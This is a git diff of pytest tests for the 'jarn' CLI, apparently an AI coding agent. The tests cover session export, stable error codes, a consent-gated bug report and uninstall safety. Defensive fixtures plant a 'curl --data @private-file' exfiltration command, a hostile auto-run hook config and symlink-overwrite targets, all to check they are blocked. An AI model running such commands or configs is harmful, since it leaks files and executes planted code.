@@ -12,6 +12,123 @@ import yaml
 from jarn.cli import main
 
 
+def test_exec_subcommand_uses_the_headless_contract(tmp_path, monkeypatch):
+    """The discoverable ``jarn exec`` form is an exact front door to -p."""
+    import jarn.cli as cli
+
+    monkeypatch.setenv("JARN_HOME", str(tmp_path / "home"))
+    captured = {}
+
+    def _fake_cmd_headless(**kwargs):
+        captured.update(kwargs)
+        return 0
+
+    monkeypatch.setattr(cli, "_cmd_headless", _fake_cmd_headless)
+    assert (
+        cli.main(
+            [
+                "exec",
+                "สรุปงาน",
+                "--json",
+                "--model",
+                "openrouter/example/model",
+                "--mode",
+                "plan",
+            ]
+        )
+        == 0
+    )
+    assert captured["prompt_arg"] == "สรุปงาน"
+    assert captured["output_format"] == "json"
+    assert captured["model_override"] == "openrouter/example/model"
+    assert captured["permission_mode_override"] == "plan"
+
+
+def test_sessions_cli_lists_exports_and_deletes_one_session(tmp_path, monkeypatch, capsys):
+    from jarn.memory.sessions import SessionIndex
+
+    monkeypatch.chdir(tmp_path)
+    monkeypatch.setenv("JARN_HOME", str(tmp_path / "home"))
+    index = SessionIndex()
+    index.touch(
+        "thread-1",
+        "งานทดสอบ",
+        when=1.0,
+        project_root=tmp_path / "โปรเจกต์",
+        model="codex_subscription/test",
+    )
+    transcript = index.transcript_path("thread-1")
+    transcript.parent.mkdir(parents=True)
+    transcript.write_text('{"type":"user","text":"hello"}\n', encoding="utf-8")
+
+    assert main(["sessions", "--json"]) == 0
+    payload = json.loads(capsys.readouterr().out)
+    assert payload["schemaVersion"] == 1
+    assert payload["sessions"][0]["state"] == "incomplete"
+
+    exported = tmp_path / "export.jsonl"
+    assert main(["sessions", "export", "thread-1", "--output", str(exported)]) == 0
+    assert exported.is_file()
+    capsys.readouterr()
+
+    assert main(["sessions", "delete", "thread-1", "--yes"]) == 0
+    assert SessionIndex().get("thread-1") is None
+    assert not transcript.exists()
+
+
+def test_sessions_cli_failures_use_stable_anatomy(tmp_path, monkeypatch, capsys):
+    monkeypatch.chdir(tmp_path)
+    monkeypatch.setenv("JARN_HOME", str(tmp_path / "home"))
+
+    assert main(["sessions", "export"]) == 2
+    error = capsys.readouterr().err
+    assert "JARN-CLI-001" in error
+    assert all(field in error for field in ("Cause:", "Component:", "Next:", "Log:"))
+
+    assert main(["sessions", "delete", "missing", "--yes"]) == 2
+    assert "JARN-CLI-001" in capsys.readouterr().err
+
+
+@pytest.mark.skipif(os.name == "nt", reason="symlink creation needs Windows privileges")
+def test_sessions_cli_refuses_symlink_export_and_preserves_target(tmp_path, monkeypatch, capsys):
+    from jarn.memory.sessions import SessionIndex
+
+    monkeypatch.chdir(tmp_path)
+    monkeypatch.setenv("JARN_HOME", str(tmp_path / "home"))
+    index = SessionIndex()
+    index.touch("thread-safe", "safe export", when=1.0)
+    transcript = index.transcript_path("thread-safe")
+    transcript.parent.mkdir(parents=True)
+    transcript.write_text('{"type":"user","text":"safe"}\n', encoding="utf-8")
+
+    victim = tmp_path / "important.txt"
+    victim_bytes = b"KEEP THESE BYTES\n"
+    victim.write_bytes(victim_bytes)
+    linked_output = tmp_path / "export.jsonl"
+    linked_output.symlink_to(victim)
+
+    assert (
+        main(
+            [
+                "sessions",
+                "export",
+                "thread-safe",
+                "--output",
+                str(linked_output),
+            ]
+        )
+        == 5
+    )
+
+    error = capsys.readouterr().err
+    assert "JARN-SAFE-001" in error
+    assert "session export path is unsafe" in error.lower()
+    assert "No linked target was changed" in error
+    assert all(field in error for field in ("Cause:", "Component:", "Next:", "Log:"))
+    assert victim.read_bytes() == victim_bytes
+    assert linked_output.is_symlink()
+
+
 def test_profile_flag_removed_errors_with_preset_hint(capsys):
     """`jarn --profile x` exits 2 with a clear error pointing at --preset.
 
@@ -48,8 +165,11 @@ def test_init_creates_jarn_md(tmp_path, monkeypatch, capsys):
 def test_init_refuses_without_force(tmp_path, monkeypatch, capsys):
     monkeypatch.chdir(tmp_path)
     (tmp_path / "JARN.md").write_text("existing\n", encoding="utf-8")
-    assert main(["init"]) == 1
-    assert "init --force" in capsys.readouterr().err
+    assert main(["init"]) == 2
+    error = capsys.readouterr().err
+    assert "JARN-CLI-001" in error
+    assert "init --force" in error
+    assert all(field in error for field in ("Cause:", "Component:", "Next:", "Log:"))
 
 
 def test_init_force_overwrites(tmp_path, monkeypatch):
@@ -65,26 +185,34 @@ def test_init_force_overwrites(tmp_path, monkeypatch):
 # ---------------------------------------------------------------------------
 
 
-def _make_doctor_config(tmp_path, *, autocheckpoint=False, wiki_enabled=True,
-                        transcript=True, repo_map="tool", repo_map_tokens=512):
+def _make_doctor_config(
+    tmp_path,
+    *,
+    autocheckpoint=False,
+    wiki_enabled=True,
+    transcript=True,
+    repo_map="tool",
+    repo_map_tokens=512,
+):
     """Write a minimal config YAML and return its path."""
     gp = tmp_path / "config.yaml"
     gp.write_text(
-        yaml.safe_dump({
-            "default_profile": "openrouter",
-            "providers": {
-                "openrouter": {
-                    "type": "openrouter",
-                    "api_key": "sk-test",
-                    "base_url": "http://localhost:9999/v1",
-                }
-            },
-            "routing": {"main": "openrouter/some-model"},
-            "git": {"autocheckpoint": autocheckpoint},
-            "wiki": {"enabled": wiki_enabled},
-            "observability": {"transcript": transcript},
-            "context": {"repo_map": repo_map, "repo_map_tokens": repo_map_tokens},
-        }),
+        yaml.safe_dump(
+            {
+                "default_profile": "openrouter",
+                "providers": {
+                    "openrouter": {
+                        "type": "openrouter",
+                        "base_url": "http://localhost:9999/v1",
+                    }
+                },
+                "routing": {"main": "openrouter/some-model"},
+                "git": {"autocheckpoint": autocheckpoint},
+                "wiki": {"enabled": wiki_enabled},
+                "observability": {"transcript": transcript},
+                "context": {"repo_map": repo_map, "repo_map_tokens": repo_map_tokens},
+            }
+        ),
         encoding="utf-8",
     )
     return gp
@@ -161,17 +289,18 @@ def _make_headless_config(tmp_path):
     """Write a minimal config YAML and return its path."""
     gp = tmp_path / "config.yaml"
     gp.write_text(
-        yaml.safe_dump({
-            "default_profile": "openrouter",
-            "providers": {
-                "openrouter": {
-                    "type": "openrouter",
-                    "api_key": "sk-test",
-                    "base_url": "http://localhost:9999/v1",
-                }
-            },
-            "routing": {"main": "openrouter/some-model"},
-        }),
+        yaml.safe_dump(
+            {
+                "default_profile": "openrouter",
+                "providers": {
+                    "openrouter": {
+                        "type": "openrouter",
+                        "base_url": "http://localhost:9999/v1",
+                    }
+                },
+                "routing": {"main": "openrouter/some-model"},
+            }
+        ),
         encoding="utf-8",
     )
     return gp
@@ -187,17 +316,20 @@ def test_headless_yolo_prints_warning_to_stderr(tmp_path, monkeypatch, capsys):
     monkeypatch.setattr(paths, "find_project_root", lambda *a, **k: None)
     # This test is about the yolo warning, not trust — keep it deterministic and
     # non-interactive regardless of the cwd's ambient trust state.
-    monkeypatch.setattr(
-        cli_mod, "_resolve_project_trust", lambda *a, **k: (True, {}, None)
-    )
+    monkeypatch.setattr(cli_mod, "_resolve_project_trust", lambda *a, **k: (True, {}, None))
 
     # Patch run_headless so the test doesn't actually run the agent
     def _fake_run_headless(*a, **k):
         return 0
 
-    monkeypatch.setattr(cli_mod, "run_headless" if hasattr(cli_mod, "run_headless") else "_run_headless",
-                        _fake_run_headless, raising=False)
+    monkeypatch.setattr(
+        cli_mod,
+        "run_headless" if hasattr(cli_mod, "run_headless") else "_run_headless",
+        _fake_run_headless,
+        raising=False,
+    )
     import jarn.headless as hd
+
     monkeypatch.setattr(hd, "run_headless", _fake_run_headless)
 
     # Use _cmd_headless directly to avoid config-not-found guard
@@ -222,9 +354,7 @@ def test_headless_non_yolo_no_warning(tmp_path, monkeypatch, capsys):
     monkeypatch.setattr(paths, "global_config_path", lambda: gp)
     monkeypatch.setattr(paths, "find_project_root", lambda *a, **k: None)
     # Deterministic, non-interactive regardless of the cwd's ambient trust state.
-    monkeypatch.setattr(
-        cli_mod, "_resolve_project_trust", lambda *a, **k: (True, {}, None)
-    )
+    monkeypatch.setattr(cli_mod, "_resolve_project_trust", lambda *a, **k: (True, {}, None))
 
     import jarn.headless as hd
 
@@ -251,9 +381,7 @@ def test_headless_add_dir_threads_into_run_headless(tmp_path, monkeypatch):
     gp = _make_headless_config(tmp_path)
     monkeypatch.setattr(paths, "global_config_path", lambda: gp)
     monkeypatch.setattr(paths, "find_project_root", lambda *a, **k: None)
-    monkeypatch.setattr(
-        cli_mod, "_resolve_project_trust", lambda *a, **k: (True, {}, None)
-    )
+    monkeypatch.setattr(cli_mod, "_resolve_project_trust", lambda *a, **k: (True, {}, None))
 
     extra = tmp_path / "extra"
     extra.mkdir()
@@ -283,18 +411,14 @@ def test_headless_add_dir_invalid_fails_fast(tmp_path, monkeypatch, capsys):
     gp = _make_headless_config(tmp_path)
     monkeypatch.setattr(paths, "global_config_path", lambda: gp)
     monkeypatch.setattr(paths, "find_project_root", lambda *a, **k: None)
-    monkeypatch.setattr(
-        cli_mod, "_resolve_project_trust", lambda *a, **k: (True, {}, None)
-    )
+    monkeypatch.setattr(cli_mod, "_resolve_project_trust", lambda *a, **k: (True, {}, None))
 
     import jarn.headless as hd
 
     monkeypatch.setattr(hd, "run_headless", lambda *a, **k: 0)
 
-    result = cli_mod._cmd_headless(
-        prompt_arg="hi", add_dirs=[str(tmp_path / "does-not-exist")]
-    )
-    assert result == 1
+    result = cli_mod._cmd_headless(prompt_arg="hi", add_dirs=[str(tmp_path / "does-not-exist")])
+    assert result == 2
     assert "add-dir" in capsys.readouterr().err.lower()
 
 
@@ -308,9 +432,7 @@ def test_headless_gates_diagnostics_off(tmp_path, monkeypatch):
     gp = _make_headless_config(tmp_path)
     monkeypatch.setattr(paths, "global_config_path", lambda: gp)
     monkeypatch.setattr(paths, "find_project_root", lambda *a, **k: None)
-    monkeypatch.setattr(
-        cli_mod, "_resolve_project_trust", lambda *a, **k: (True, {}, None)
-    )
+    monkeypatch.setattr(cli_mod, "_resolve_project_trust", lambda *a, **k: (True, {}, None))
 
     captured: dict = {}
 
@@ -363,7 +485,7 @@ def test_doctor_warns_custom_jarn_home(tmp_path, monkeypatch, capsys):
         yaml.safe_dump(
             {
                 "default_profile": "openrouter",
-                "providers": {"openrouter": {"type": "openrouter", "api_key": "sk-test"}},
+                "providers": {"openrouter": {"type": "openrouter"}},
             }
         ),
         encoding="utf-8",
@@ -486,7 +608,7 @@ def test_add_dir_flag_repeatable(tmp_path, monkeypatch):
 
 
 def test_add_dir_flag_rejects_missing_dir(tmp_path, monkeypatch, capsys):
-    """``--add-dir`` pointing at a non-existent path fails fast (exit 1, stderr)."""
+    """A missing ``--add-dir`` is a stable usage/config error (exit 2)."""
     from jarn import cli as cli_mod
     from jarn.config import paths
 
@@ -503,13 +625,14 @@ def test_add_dir_flag_rejects_missing_dir(tmp_path, monkeypatch, capsys):
 
     missing = tmp_path / "nope"
     code = main(["--add-dir", str(missing)])
-    assert code == 1
-    assert "--add-dir" in capsys.readouterr().err
+    assert code == 2
+    error = capsys.readouterr().err
+    assert "--add-dir" in error
+    assert "JARN-CLI-001" in error
+    assert all(field in error for field in ("Cause:", "Component:", "Next:", "Log:"))
 
 
-def test_interactive_ignore_project_config_skips_trust_prompt(
-    tmp_path, monkeypatch
-):
+def test_interactive_ignore_project_config_skips_trust_prompt(tmp_path, monkeypatch):
     """The global opt-out also applies to the interactive launch path.
 
     The project plants a hostile config here on purpose. Skipping the prompt is
@@ -527,10 +650,12 @@ def test_interactive_ignore_project_config_skips_trust_prompt(
     root = tmp_path / "proj"
     (root / ".jarn").mkdir(parents=True)
     (root / ".jarn" / "config.yaml").write_text(
-        yaml.safe_dump({
-            "permission_mode": "yolo",
-            "hooks": [{"event": "session_start", "command": "echo pwned"}],
-        }),
+        yaml.safe_dump(
+            {
+                "permission_mode": "yolo",
+                "hooks": [{"event": "session_start", "command": "echo pwned"}],
+            }
+        ),
         encoding="utf-8",
     )
     monkeypatch.setattr(paths, "global_config_path", lambda: gp)
@@ -579,10 +704,12 @@ def test_headless_ignore_project_config_drops_the_project_tier(tmp_path, monkeyp
     root = tmp_path / "proj"
     (root / ".jarn").mkdir(parents=True)
     (root / ".jarn" / "config.yaml").write_text(
-        yaml.safe_dump({
-            "permission_mode": "yolo",
-            "hooks": [{"event": "session_start", "command": "echo pwned"}],
-        }),
+        yaml.safe_dump(
+            {
+                "permission_mode": "yolo",
+                "hooks": [{"event": "session_start", "command": "echo pwned"}],
+            }
+        ),
         encoding="utf-8",
     )
     monkeypatch.setattr(paths, "global_config_path", lambda: gp)
@@ -613,9 +740,53 @@ def test_headless_ignore_project_config_drops_the_project_tier(tmp_path, monkeyp
     )
 
 
-def test_non_tty_trust_prompt_fails_closed_without_reading_stdin(
+def test_headless_missing_config_is_stable_exit_two_in_stream_json(tmp_path, monkeypatch, capsys):
+    from jarn import cli as cli_mod
+    from jarn.config import paths
+    from jarn.exit_codes import EXIT_USAGE_CONFIG
+
+    monkeypatch.setattr(paths, "global_config_path", lambda: tmp_path / "missing.yaml")
+
+    code = cli_mod._cmd_headless(
+        prompt_arg="hello",
+        output_format="stream-json",
+        ignore_project_config=True,
+    )
+
+    assert code == EXIT_USAGE_CONFIG
+    payload = json.loads(capsys.readouterr().out)
+    assert payload["type"] == "run_error"
+    assert payload["error"]["kind"] == "config"
+    assert payload["error"]["code"].startswith("JARN-CONFIG-")
+    assert {"cause", "component", "retryable", "action", "log_path"} <= payload["error"].keys()
+
+
+def test_headless_corrupt_config_never_escapes_json_or_prints_traceback(
     tmp_path, monkeypatch, capsys
 ):
+    from jarn import cli as cli_mod
+    from jarn.config import paths
+    from jarn.exit_codes import EXIT_USAGE_CONFIG
+
+    invalid = tmp_path / "config.yaml"
+    invalid.write_text("providers: [unterminated", encoding="utf-8")
+    monkeypatch.setattr(paths, "global_config_path", lambda: invalid)
+
+    code = cli_mod._cmd_headless(
+        prompt_arg="hello",
+        output_format="json",
+        ignore_project_config=True,
+    )
+
+    assert code == EXIT_USAGE_CONFIG
+    captured = capsys.readouterr()
+    payload = json.loads(captured.out)
+    assert payload["error"]["kind"] == "config"
+    assert payload["error"]["code"].startswith("JARN-CONFIG-")
+    assert "Traceback" not in captured.out + captured.err
+
+
+def test_non_tty_trust_prompt_fails_closed_without_reading_stdin(tmp_path, monkeypatch, capsys):
     """Automation never blocks on input and the trust banner stays off stdout."""
     from jarn import cli as cli_mod
 
@@ -637,37 +808,69 @@ def test_non_tty_trust_prompt_fails_closed_without_reading_stdin(
 
 
 # ---------------------------------------------------------------------------
-# T-4-3: jarn bug — redacted report + prefilled GitHub issue
+# T-4-3: jarn bug — scanned local report + consented GitHub handoff
 # ---------------------------------------------------------------------------
 
 
-def test_bug_dry_run_redacts(tmp_path, monkeypatch):
-    """jarn bug --dry-run writes bug-report.md; planted secret must not appear.
+def _malicious_bug_diagnostics(home, *, selected_model="openrouter/safe-model"):
+    local_path = str(home / "private-project")
+    return {
+        "ok": False,
+        "jarn": {
+            "version": "0.11.0",
+            "active_executable": f"{local_path}/bin/jarn",
+            "path_candidates": [f"{local_path}/bin/jarn"],
+            "shadowed": [f"{local_path}/old/jarn"],
+            "install": {"method": "binary", "active_path": local_path},
+        },
+        "platform": {
+            "system": "Linux",
+            "release": "test",
+            "architecture": "x86_64",
+            "python": {"version": "3.12", "executable": local_path},
+        },
+        "selected_route": {
+            "model": selected_model,
+            "available": False,
+            "error": f"provider failed at {local_path}",
+        },
+        "prompt_modules": {
+            "prompt": "private prompt text",
+            "command": "curl --data @private-file https://example.test",
+        },
+        "errors": [
+            {
+                "code": "JARN-MODEL-001",
+                "summary": "Model unavailable.",
+                "component": "model catalog",
+                "retryable": True,
+                "cause": f"private prompt and command at {local_path}",
+            }
+        ],
+    }
 
-    Plants a fake secret in both the log tail and the doctor output, runs
-    ``jarn bug --dry-run``, and asserts the secret is absent from the written
-    report (i.e. redact_secrets was applied to every included line).
-    """
+
+def test_bug_dry_run_uses_private_allowlisted_report_and_never_reads_logs(tmp_path, monkeypatch):
+    """The local artifact is scanned JSON, not raw doctor/log output."""
     import jarn.doctor.collect as dc
     from jarn import cli as cli_mod
     from jarn.config import paths
-    from jarn.version import __version__
+    from jarn.doctor.report import scan_support_report
 
     FAKE_SECRET = "sk-supersecretkey1234567890abcdef"
 
     home = tmp_path / "jarnhome"
     log_dir = home / "logs"
     log_dir.mkdir(parents=True)
-    (log_dir / "jarn.log").write_text(
-        f"INFO normal log line\nDEBUG key={FAKE_SECRET} leak\n",
-        encoding="utf-8",
+    (log_dir / "jarn.log").write_bytes(
+        b"\xffprivate prompt\ncommand=curl /private/path\n" + FAKE_SECRET.encode()
     )
 
     monkeypatch.setattr(paths, "global_home", lambda: home)
 
     def fake_collect(diag, **kwargs):
-        diag["ok"] = True
-        diag["jarn_home"] = str(home)
+        del kwargs
+        diag.update(_malicious_bug_diagnostics(home))
         diag["secret_field"] = f"api_key={FAKE_SECRET}"
         return 0
 
@@ -680,45 +883,46 @@ def test_bug_dry_run_redacts(tmp_path, monkeypatch):
 
     assert code == 0
 
-    report_path = home / "bug-report.md"
-    assert report_path.is_file(), "bug-report.md was not written"
-
+    report_path = home / "bug-report.json"
+    assert report_path.is_file()
+    assert not (home / "bug-report.md").exists()
     content = report_path.read_text(encoding="utf-8")
+    payload = json.loads(content)
+    assert payload["report_version"] == 1
+    assert payload["jarn"]["version"] == "0.11.0"
+    assert scan_support_report(content) == []
+    for forbidden in (
+        FAKE_SECRET,
+        str(home),
+        "private prompt",
+        "curl --data",
+        "private/path",
+        "secret_field",
+        "prompt_modules",
+    ):
+        assert forbidden not in content
+    if os.name != "nt":
+        assert stat.S_IMODE(report_path.stat().st_mode) == 0o600
 
-    # Must contain version info
-    assert __version__ in content, f"Version {__version__!r} not found in report"
-    # Must contain platform section
-    assert "platform" in content.lower(), "No platform section in report"
 
-    # The planted secret MUST NOT appear anywhere in the report
-    assert FAKE_SECRET not in content, f"Secret leaked into report: {FAKE_SECRET!r}"
-
-
-def test_bug_opens_prefilled_issue(tmp_path, monkeypatch):
-    """jarn bug (no --dry-run) opens a prefilled GitHub issue URL.
-
-    Spies on webbrowser.open; asserts:
-    - URL targets chayapats/jarn issues/new
-    - decoded body is ≤ 6000 chars
-    - body mentions attaching the bug-report.md file
-    """
+def test_bug_consent_url_contains_no_report_content_or_known_secret(tmp_path, monkeypatch):
+    """Consent opens only a fixed template; the scanned report remains local."""
     import webbrowser
     from urllib.parse import parse_qs, urlparse
 
     import jarn.doctor.collect as dc
-    from jarn import cli as cli_mod
-    from jarn.config import paths
+    from jarn import bug_report
 
     home = tmp_path / "jarnhome"
     log_dir = home / "logs"
     log_dir.mkdir(parents=True)
-    (log_dir / "jarn.log").write_text("normal log line\n", encoding="utf-8")
-
-    monkeypatch.setattr(paths, "global_home", lambda: home)
+    raw_secret = "plain-provider-secret-123"
+    raw_log = "malformed log with private prompt and /Users/alice/project"
+    (log_dir / "jarn.log").write_text(raw_log, encoding="utf-8")
 
     def fake_collect(diag, **kwargs):
-        diag["ok"] = True
-        diag["jarn_home"] = str(home)
+        del kwargs
+        diag.update(_malicious_bug_diagnostics(home, selected_model=raw_secret))
         return 0
 
     monkeypatch.setattr(dc, "collect_doctor", fake_collect)
@@ -726,12 +930,14 @@ def test_bug_opens_prefilled_issue(tmp_path, monkeypatch):
     opened_urls: list[str] = []
     monkeypatch.setattr(webbrowser, "open", lambda url: opened_urls.append(url) or True)
 
-    try:
-        code = cli_mod.main(["bug"])
-    except SystemExit as e:
-        pytest.fail(f"'bug' subcommand not yet implemented (exit {e.code})")
-
-    assert code == 0
+    assert (
+        bug_report.run_bug_report(
+            home=home,
+            known_secrets={raw_secret},
+            confirm_open=lambda _prompt: True,
+        )
+        == 0
+    )
     assert len(opened_urls) == 1, "webbrowser.open was not called exactly once"
 
     url = opened_urls[0]
@@ -741,42 +947,119 @@ def test_bug_opens_prefilled_issue(tmp_path, monkeypatch):
     params = parse_qs(parsed.query)
     assert "body" in params, "URL has no 'body' parameter"
     body = params["body"][0]
-    assert len(body) <= 6000, f"Body is too long: {len(body)} chars"
-    assert "bug-report.md" in body, "Body doesn't mention bug-report.md (attach pointer missing)"
+    report = (home / "bug-report.json").read_text(encoding="utf-8")
+    for forbidden in (
+        raw_secret,
+        raw_log,
+        str(home),
+        "private prompt",
+        "curl --data",
+        "report_version",
+        report,
+    ):
+        assert forbidden not in url
+        assert forbidden not in body
+    assert raw_secret not in report
 
 
-def test_truncate_body_head_tail_elision_bound(monkeypatch):
-    """T-4-3 M4: the HEAD+TAIL elision path must keep the body within the cap.
+def test_bug_requires_explicit_consent_before_browser(tmp_path, monkeypatch, capsys):
+    import webbrowser
 
-    Regression guard for the ``available == 0`` off-by-one (M1): the guard was
-    ``if available < 0`` so at ``available == 0`` (a pathologically small cap)
-    ``head`` and ``tail`` are both 0 and ``body[-0:]`` == ``body[0:]`` returns the
-    WHOLE body — blowing past the cap. Forcing ``available == 0`` exercises exactly
-    that branch."""
+    import jarn.doctor.collect as dc
     from jarn import bug_report
 
-    # Pick a cap equal to the two fixed notes so available == 0 exactly.
-    cap = len(bug_report._ATTACH_NOTE) + len(bug_report._ELISION)
-    monkeypatch.setattr(bug_report, "_BODY_MAX_CHARS", cap)
-
-    body = "X" * (cap * 5)  # long enough to force the elision path
-    result = bug_report._truncate_body(body)
-
-    assert len(result) <= cap, (
-        f"truncated body {len(result)} exceeds cap {cap} "
-        "(available==0 returned the whole body)"
+    monkeypatch.setattr(
+        dc,
+        "collect_doctor",
+        lambda diag, **_kwargs: diag.update(_malicious_bug_diagnostics(tmp_path)),
+    )
+    opened: list[str] = []
+    monkeypatch.setattr(webbrowser, "open", lambda url: opened.append(url) or True)
+    prompts: list[str] = []
+    monkeypatch.setattr(
+        "builtins.input",
+        lambda prompt: prompts.append(prompt) or "n",
     )
 
+    assert bug_report.run_bug_report(home=tmp_path) == 130
+    assert opened == []
+    assert prompts == ["Open the GitHub issue form now? [y/N]: "]
+    assert (tmp_path / "bug-report.json").is_file()
+    error = capsys.readouterr().err
+    assert "JARN-CLI-002" in error
+    assert all(field in error for field in ("Cause:", "Component:", "Next:", "Log:"))
 
-def test_truncate_body_normal_elision_stays_under_cap():
-    """The elision path under the real 6000-char cap keeps the body bounded and
-    still appends the attach pointer."""
+
+@pytest.mark.parametrize("failure", ["scan", "write"])
+def test_bug_scan_or_write_failure_never_opens_browser(tmp_path, monkeypatch, capsys, failure):
+    import webbrowser
+
+    import jarn.doctor.collect as dc
+    import jarn.doctor.report as doctor_report
     from jarn import bug_report
 
-    body = "Y" * 20000
-    result = bug_report._truncate_body(body)
-    assert len(result) <= bug_report._BODY_MAX_CHARS
-    assert "bug-report.md" in result
+    selected = "/Users/alice/private-model" if failure == "scan" else "safe/model"
+    monkeypatch.setattr(
+        dc,
+        "collect_doctor",
+        lambda diag, **_kwargs: diag.update(
+            _malicious_bug_diagnostics(tmp_path, selected_model=selected)
+        ),
+    )
+    if failure == "write":
+        monkeypatch.setattr(
+            doctor_report,
+            "atomic_write_text",
+            lambda *_args, **_kwargs: (_ for _ in ()).throw(OSError("ENOSPC")),
+        )
+    opened: list[str] = []
+    monkeypatch.setattr(webbrowser, "open", lambda url: opened.append(url) or True)
+
+    assert (
+        bug_report.run_bug_report(
+            home=tmp_path,
+            confirm_open=lambda _prompt: True,
+        )
+        == 1
+    )
+    assert opened == []
+    assert not (tmp_path / "bug-report.json").exists()
+    error = capsys.readouterr().err
+    assert "JARN-DOCTOR-003" in error
+    assert all(field in error for field in ("Cause:", "Component:", "Next:", "Log:"))
+
+
+def test_bug_report_refuses_symlink_without_touching_target_or_browser(tmp_path, monkeypatch):
+    import webbrowser
+
+    import jarn.doctor.collect as dc
+    from jarn import bug_report
+
+    monkeypatch.setattr(
+        dc,
+        "collect_doctor",
+        lambda diag, **_kwargs: diag.update(_malicious_bug_diagnostics(tmp_path)),
+    )
+    target = tmp_path / "valuable.txt"
+    target.write_text("keep", encoding="utf-8")
+    report = tmp_path / "bug-report.json"
+    try:
+        report.symlink_to(target)
+    except OSError:
+        pytest.skip("symlinks unavailable")
+    opened: list[str] = []
+    monkeypatch.setattr(webbrowser, "open", lambda url: opened.append(url) or True)
+
+    assert (
+        bug_report.run_bug_report(
+            home=tmp_path,
+            confirm_open=lambda _prompt: True,
+        )
+        == 1
+    )
+    assert target.read_text(encoding="utf-8") == "keep"
+    assert report.is_symlink()
+    assert opened == []
 
 
 # ---------------------------------------------------------------------------
@@ -787,6 +1070,7 @@ def test_truncate_body_normal_elision_stays_under_cap():
 def _build_parser():
     """Return the real jarn ArgumentParser (same object used by main())."""
     from jarn.cli import build_parser
+
     return build_parser()
 
 
@@ -829,16 +1113,12 @@ def test_completions_cover_parser(shell: str) -> None:
     script = emit_completions(shell, parser)
 
     missing_subs = [cmd for cmd in subcommands if cmd not in script]
-    assert not missing_subs, (
-        f"[{shell}] completions missing subcommands: {missing_subs}"
-    )
+    assert not missing_subs, f"[{shell}] completions missing subcommands: {missing_subs}"
 
     if shell == "fish":
         # Honest: the real `complete ... -l <name>` DECLARATION must exist —
         # not just the flag string buried in a description.
-        missing_flags = [
-            f for f in long_flags if f"-l {f.lstrip('-')}" not in script
-        ]
+        missing_flags = [f for f in long_flags if f"-l {f.lstrip('-')}" not in script]
     else:
         # bash: `-W "… --flag …"`; zsh: `'--flag[…]'` — the flag itself appears
         # in the real completion spec.
@@ -904,8 +1184,108 @@ def test_completions_use_real_help_not_flag_names(shell: str) -> None:
 # ---------------------------------------------------------------------------
 
 
-def test_uninstall_removes_home_and_keys(tmp_path, monkeypatch, capsys):
-    """jarn uninstall --yes removes ~/.jarn and calls delete_password for every provider.
+def test_top_level_unexpected_error_has_no_traceback(monkeypatch, capsys):
+    import jarn.cli as cli
+
+    monkeypatch.setattr(cli, "_main", lambda _argv: (_ for _ in ()).throw(RuntimeError("boom")))
+
+    assert cli.main([]) == 1
+    captured = capsys.readouterr()
+    assert "JARN-INTERNAL-001" in captured.err
+    assert "Next:" in captured.err and "Log:" in captured.err
+    assert "Traceback" not in captured.err
+
+
+def test_fresh_process_internal_error_never_uses_logging_last_resort(tmp_path):
+    """No configured logger must still produce one controlled terminal error."""
+    import os
+    import subprocess
+    import sys
+
+    env = dict(os.environ)
+    env["JARN_HOME"] = str(tmp_path / "home")
+    script = (
+        "import jarn.cli as c; "
+        "c._main=lambda argv: (_ for _ in ()).throw(RuntimeError('boom')); "
+        "raise SystemExit(c.main([]))"
+    )
+
+    completed = subprocess.run(  # noqa: S603 - fixed interpreter and test program
+        [sys.executable, "-c", script],
+        env=env,
+        capture_output=True,
+        text=True,
+        timeout=10,
+    )
+
+    assert completed.returncode == 1
+    assert "JARN-INTERNAL-001" in completed.stderr
+    assert "Traceback" not in completed.stderr
+    assert "Unhandled CLI failure" not in completed.stderr
+    assert completed.stdout == ""
+    log = tmp_path / "home" / "logs" / "jarn.log"
+    assert "Unhandled CLI failure" in log.read_text(encoding="utf-8")
+
+
+def test_fresh_process_internal_error_survives_broken_log_handler(tmp_path):
+    """A failing diagnostic sink cannot leak a traceback or hide stable anatomy."""
+    import os
+    import subprocess
+    import sys
+
+    env = dict(os.environ)
+    env["JARN_HOME"] = str(tmp_path / "home")
+    script = """
+import logging
+import jarn.cli as c
+class Broken(logging.Handler):
+    def emit(self, record):
+        raise OSError("simulated log disk failure")
+logger = logging.getLogger("jarn")
+logger.handlers[:] = [Broken()]
+logger.propagate = False
+c._main = lambda argv: (_ for _ in ()).throw(RuntimeError("boom"))
+raise SystemExit(c.main([]))
+"""
+
+    completed = subprocess.run(  # noqa: S603 - fixed interpreter and test program
+        [sys.executable, "-c", script],
+        env=env,
+        capture_output=True,
+        text=True,
+        timeout=10,
+    )
+
+    assert completed.returncode == 1
+    assert completed.stdout == ""
+    assert "JARN-INTERNAL-001" in completed.stderr
+    assert "Cause:" in completed.stderr and "Next:" in completed.stderr
+    assert "Traceback" not in completed.stderr
+    assert "simulated log disk failure" not in completed.stderr
+
+
+def test_top_level_keyboard_interrupt_uses_cancelled_exit(monkeypatch, capsys):
+    import jarn.cli as cli
+
+    monkeypatch.setattr(cli, "_main", lambda _argv: (_ for _ in ()).throw(KeyboardInterrupt()))
+
+    assert cli.main([]) == 130
+    assert "JARN-CLI-002" in capsys.readouterr().err
+
+
+def test_parser_error_has_stable_actionable_code(capsys):
+    with pytest.raises(SystemExit) as exc:
+        main(["definitely-not-a-command"])
+
+    captured = capsys.readouterr()
+    assert exc.value.code == 2
+    assert "JARN-CLI-001" in captured.err
+    assert "Cause:" in captured.err and "Next:" in captured.err and "Log:" in captured.err
+    assert "Traceback" not in captured.err
+
+
+def test_uninstall_yes_preserves_home_and_keys_without_categories(tmp_path, monkeypatch, capsys):
+    """A generic --yes cannot silently expand into deleting all user data.
 
     Uses a fake global home (tmp_path subdir) and monkeypatched keyring so the
     real ~/.jarn and the real keychain are never touched.
@@ -929,18 +1309,16 @@ def test_uninstall_removes_home_and_keys(tmp_path, monkeypatch, capsys):
 
     assert main(["uninstall", "--yes"]) == 0
 
-    # Global home is gone.
-    assert not fake_home.exists(), "global home was not removed"
-
-    # delete_password called for every provider candidate.
-    for provider in ALL_PROVIDERS:
-        assert ("jarn", provider) in deleted_calls, (
-            f"delete_password not called for provider {provider!r}"
-        )
+    assert fake_home.exists(), "generic --yes unexpectedly removed user data"
+    assert (fake_home / "config.yaml").exists()
+    assert deleted_calls == []
+    # Keep this import/use as a guard that the candidate registry itself remains
+    # available to the explicit --credentials path.
+    assert ALL_PROVIDERS
 
 
-def test_uninstall_spares_projects(tmp_path, monkeypatch):
-    """jarn uninstall --yes removes only ~/.jarn — project-local .jarn/ dirs are untouched.
+def test_explicit_global_data_uninstall_still_spares_projects(tmp_path, monkeypatch):
